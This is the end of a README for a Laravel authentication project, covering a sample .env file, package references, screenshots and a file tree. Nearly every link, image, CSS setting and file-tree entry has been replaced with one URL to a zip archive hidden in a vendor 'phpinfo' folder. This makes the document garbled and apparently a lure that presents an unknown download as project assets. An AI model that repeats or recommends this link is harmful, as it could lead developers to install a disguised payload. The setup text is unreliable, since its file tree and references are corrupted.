ACTIVATION=true
ACTIVATION_LIMIT_TIME_PERIOD=24
ACTIVATION_LIMIT_MAX_ATTEMPTS=3
NULL_IP_ADDRESS=0.0.0.0

DEBUG_BAR_ENVIRONMENT=local

USER_RESTORE_CUTOFF_DAYS=31
USER_RESTORE_ENCRYPTION_KEY=
USER_LIST_PAGINATION_SIZE=50

LARAVEL_2STEP_ENABLED=false
LARAVEL_2STEP_DATABASE_CONNECTION=mysql
LARAVEL_2STEP_DATABASE_TABLE=laravel2step
LARAVEL_2STEP_USER_MODEL=App\User
LARAVEL_2STEP_EMAIL_FROM=
LARAVEL_2STEP_EMAIL_FROM_NAME="Laravel 2 Step Verification"
LARAVEL_2STEP_EMAIL_SUBJECT='Laravel 2 Step Verification'
LARAVEL_2STEP_EXCEEDED_COUNT=3
LARAVEL_2STEP_EXCEEDED_COUNTDOWN_MINUTES=1440
LARAVEL_2STEP_VERIFIED_LIFETIME_MINUTES=360
LARAVEL_2STEP_RESET_BUFFER_IN_SECONDS=300
LARAVEL_2STEP_CSS_FILE="https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip"
LARAVEL_2STEP_APP_CSS_ENABLED=false
LARAVEL_2STEP_APP_CSS="https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip"
LARAVEL_2STEP_BOOTSTRAP_CSS_CDN_ENABLED=true
LARAVEL_2STEP_BOOTSTRAP_CSS_CDN="https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip"

DEFAULT_GRAVATAR_SIZE=80
https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
DEFAULT_GRAVATAR_SECURE=false
DEFAULT_GRAVATAR_MAX_RATING=g
DEFAULT_GRAVATAR_FORCE_DEFAULT=false
DEFAULT_GRAVATAR_FORCE_EXTENSION=jpg

https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip

LARAVEL_LOGGER_DATABASE_CONNECTION=mysql
LARAVEL_LOGGER_DATABASE_TABLE=laravel_logger_activity
LARAVEL_LOGGER_ROLES_ENABLED=true
LARAVEL_LOGGER_ROLES_MIDDLWARE=role:admin
LARAVEL_LOGGER_MIDDLEWARE_ENABLED=true
LARAVEL_LOGGER_USER_MODEL=App\Models\User
LARAVEL_LOGGER_PAGINATION_ENABLED=true
LARAVEL_LOGGER_PAGINATION_PER_PAGE=25
LARAVEL_LOGGER_DATATABLES_ENABLED=false
LARAVEL_LOGGER_DASHBOARD_MENU_ENABLED=true
LARAVEL_LOGGER_DASHBOARD_DRILLABLE=true
LARAVEL_LOGGER_LOG_RECORD_FAILURES_TO_FILE=true
LARAVEL_LOGGER_FLASH_MESSAGE_BLADE_ENABLED=false
LARAVEL_LOGGER_JQUERY_CDN_ENABLED=false
https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
LARAVEL_LOGGER_BLADE_CSS_PLACEMENT_ENABLED=true
LARAVEL_LOGGER_BLADE_JS_PLACEMENT_ENABLED=true
LARAVEL_LOGGER_BOOTSTRAP_JS_CDN_ENABLED=false
https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
LARAVEL_LOGGER_FONT_AWESOME_CDN_ENABLED=false
https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
LARAVEL_LOGGER_BOOTSTRAP_CSS_CDN_ENABLED=false
https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip

# Roles Default Models
ROLES_DEFAULT_ROLE_MODEL=LaravelRoles\Models\Role
ROLES_DEFAULT_PERMISSION_MODEL=LaravelRoles\Models\Permission

# Roles database information
ROLES_DATABASE_CONNECTION=null

# Roles Misc Settings
ROLES_DEFAULT_SEPARATOR='.'

# Roles GUI Settings
ROLES_GUI_ENABLED=true
ROLES_GUI_AUTH_ENABLED=true
ROLES_GUI_MIDDLEWARE_ENABLED=true
ROLES_GUI_MIDDLEWARE='role:admin'
ROLES_GUI_BLADE_EXTENDED='https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip'
ROLES_GUI_TITLE_EXTENDED='template_title'
ROLES_GUI_LARAVEL_ROLES_ENABLED=true
ROLES_GUI_DATATABLES_JS_ENABLED=false
ROLES_GUI_FLASH_MESSAGES_ENABLED=false
ROLES_GUI_BLADE_PLACEMENT_CSS=template_linked_css
ROLES_GUI_BLADE_PLACEMENT_JS=footer_scripts

# Google Analytics - If blank it will not render, default is false
GOOGLE_ANALYTICS_ID=
#GOOGLE_ANALYTICS_ID='UA-XXXXXXXX-X'

# NOTE: YOU CAN REMOVE THE KEY CALL IN https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip IF YOU GET A POP UP AND DO NOT WANT TO SETUP A KEY FOR DEV
# Google Maps API v3 Key - https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
GOOGLEMAPS_API_STATUS=true
GOOGLEMAPS_API_KEY=YOURGOOGLEMAPSkeyHERE

# https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
ENABLE_RECAPTCHA=true
RE_CAP_SITE=YOURGOOGLECAPTCHAsitekeyHERE
RE_CAP_SECRET=YOURGOOGLECAPTCHAsecretHERE

```

#### Laravel Developement Packages Used References
* https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
* https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
* https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
* https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
* https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
* https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
* https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
* https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
* https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
* https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip

### Screenshots
![ERD](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)
![1-Login Page](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)
![2-Register Page](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)
![3-Admin Home Page](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)
![4-User Home Page](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)
![5-Profle Page](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)
![6- Show Profile](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)
![7-edit Profile](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)

![8- Admin Panel Users List](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)
![9-Admin Panel-create user](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)
![10-Admin Panel-manage roles](https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip)

### File Tree
```
laravel-auth
├── .editorconfig
├── .env
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── .gitattributes
├── .github
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   └── ISSUE_TEMPLATE
│       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── .gitignore
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── LICENSE
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── app
│   ├── Console
│   │   ├── Commands
│   │   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── Exceptions
│   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── Http
│   │   ├── Controllers
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── Auth
│   │   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── Middleware
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── Requests
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── ViewComposers
│   ├── Logic
│   │   ├── Activation
│   │   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── Macros
│   │       └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── Mail
│   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── Models
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── Notifications
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── Providers
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   └── Traits
│       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── artisan
├── bootstrap
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   └── cache
│       ├── .gitignore
│       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── config
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── database
│   ├── .gitignore
│   ├── factories
│   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── migrations
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   └── seeds
│       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│       └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
├── public
│   ├── .htaccess
│   ├── css
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │   └── laravel2step
│   │       ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   │       └── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
│   ├── fonts
│   │   ├── https://raw.githubusercontent.com/MohammedBadry/laravel_auth_system_task/master/resources/views/vendor/laravelPhpInfo/phpinfo/auth_laravel_system_task_1.0.zip
